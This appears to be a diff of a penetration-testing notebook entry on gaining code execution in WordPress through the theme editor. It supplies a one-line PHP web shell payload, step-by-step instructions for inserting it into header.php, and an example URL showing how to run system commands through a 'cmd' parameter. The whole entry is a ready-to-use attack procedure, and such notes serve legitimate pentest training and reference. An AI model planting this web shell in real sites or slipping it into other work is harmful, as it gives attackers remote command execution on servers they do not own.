@@ -30,27 +30,53 @@ Authenticated users with the ability to edit themes can easily add PHP code to a
 
 Authenticated users with the ability to edit themes can easily add PHP code to a WordPress site, which will be executed as the web application's user.
 
+
+
 # Instructions
 
 1. Select a payload. Suggested:
 
+
+
 **Code**: [[<?php system($_REQUEST['cmd']); ?>]]
 
+
+
+
+
 2. Log into the WordPress site, then select Themes > Editor
+
+
+
+![bd4d7d69-7cf2-47f4-86dd-a78577f75e66.png](_assets/images/Mark/bd4d7d69-7cf2-47f4-86dd-a78577f75e66.png)
+
+
 
 3. Select a page to modify in the right hand menu. The Header page (header.php) is selected since it is loaded on most pages, therefore easy to trigger the code.
 
 4. Add the PHP payload to the file, then click 'Update File'
 
+
+
+![f385d07c-a1cd-480f-a0fe-8694877c3ddb.png](_assets/images/Mark/f385d07c-a1cd-480f-a0fe-8694877c3ddb.png)
+
+
+
 5. Browse to a page on the site which includes the header.php (the root page of the site should be sufficient). In order to execute commands using the payload, 'cmd=<COMMAND' is appended to the URL as an argument.
+
+
 
 For example, if the URL is: 
 
 [http://10.10.10.10/blog](http://10.10.10.10/blog)
 
+
+
 Commands can be executed by browsing to:
 
 [http://10.10.10.10/blog?cmd=whoami](http://10.10.10.10/blog?cmd=whoami)
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -67,3 +93,5 @@ Commands can be executed by browsing to:
 
 - [[shell]]
 - [[Web Applications]]
+
+
